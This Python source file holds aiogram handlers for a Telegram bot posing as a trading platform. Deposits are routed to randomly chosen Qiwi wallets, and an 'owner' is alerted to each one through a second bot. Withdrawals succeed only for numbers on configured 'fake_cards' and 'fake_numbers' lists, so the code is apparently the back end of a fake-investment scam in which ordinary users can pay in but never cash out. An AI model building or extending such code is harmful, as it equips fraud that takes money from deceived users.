from secrets import token_hex
from random import choice

from aiogram import types
from aiogram.dispatcher.storage import FSMContext

from data import texts, keyboards
from data.states import Add, Out
from loader import config, main_bot
from customutils import load_config, save_config
from models import TradingUser, TradingPayment


async def add(message: types.Message, user: TradingUser):
    await message.answer(texts.add_amount.format(min_amount=user.min_dep))
    await Add.main.set()


async def add_pay_card(query: types.CallbackQuery):
    await query.answer(texts.pay_card_alert, show_alert=True)


async def add_check(query: types.CallbackQuery, user: TradingUser):
    payment_id = int(query.data.split("_")[1])
    try:
        payment = TradingPayment.get(id=payment_id)
        if payment.done:  # 1 or 2
            user.balance += payment.amount
            user.save()
            await query.message.edit_text(texts.add_amount_done)
            await query.message.answer(
                texts.add_done.format(amount=payment.amount, balance=user.balance)
            )
        else:
            await query.answer(texts.add_invalid_alert, show_alert=True)
    except TradingPayment.DoesNotExist:
        await query.message.delete()


async def invalid_add_amount(message: types.Message):
    await message.answer(texts.add_amount_invalid.format(min_amount=config.min_deposit))


async def add_amount(message: types.Message, user: TradingUser, state: FSMContext):
    amount = int(message.text)
    if amount < user.min_dep:
        await message.answer(
            texts.add_amount_small.format(
                min_amount=user.min_dep,
            )
        )
        return

    config = load_config()
    if config.qiwis:
        public_key = choice(config.qiwis).public_key
        comment = "tr" + token_hex(8)
        payment = TradingPayment.create(
            owner=user,
            comment=comment,
            amount=amount,
        )
        await message.answer(
            texts.add_go.format(
                amount=amount,
                public_key=public_key,
                comment=comment,
            ),
            reply_markup=keyboards.add_keyboard(
                amount, public_key, comment, payment.id
            ),
        )
        await main_bot.send_message(
            user.owner.cid,
            texts.main_add_request.format(
                mention=texts.mention_text.format(user_id=user.cid, text=user.fullname),
                user_id=user.id,
                amount=amount,
            ),
            reply_markup=keyboards.main_accept_add_keyboard(payment.id),  # payment id
        )
        await state.finish()
    else:
        config.trading_work = False
        save_config(config)


async def out(message: types.Message, user: TradingUser):
    if user.balance < config.trading_min_out:
        await message.answer(
            texts.out_insert_invalid.format(
                min_amount=config.trading_min_out, amount=user.balance
            )
        )
        return
    await message.answer(
        texts.out_insert.format(min_amount=config.trading_min_out, amount=user.balance)
    )
    await Out.main.set()


async def out_number(message: types.Message, user: TradingUser, state: FSMContext):
    if (
        message.text.replace("+", "")
        in config.fake_cards.russian
        + config.fake_cards.ukrainian
        + config.fake_numbers.russian
        + config.fake_numbers.ukrainian
    ):
        await message.answer(
            texts.out_request.format(
                number=message.text,
                amount=user.balance,
            )
        )
        await main_bot.send_message(
            user.owner.cid,
            texts.main_out_request.format(
                mention=texts.mention_text.format(user_id=user.cid, text=user.fullname),
                user_id=user.id,
                amount=user.balance,
            ),
            reply_markup=keyboards.main_accept_out_keyboard(user.id),
        )
        await state.finish()
    else:
        await message.answer(texts.out_invalid)
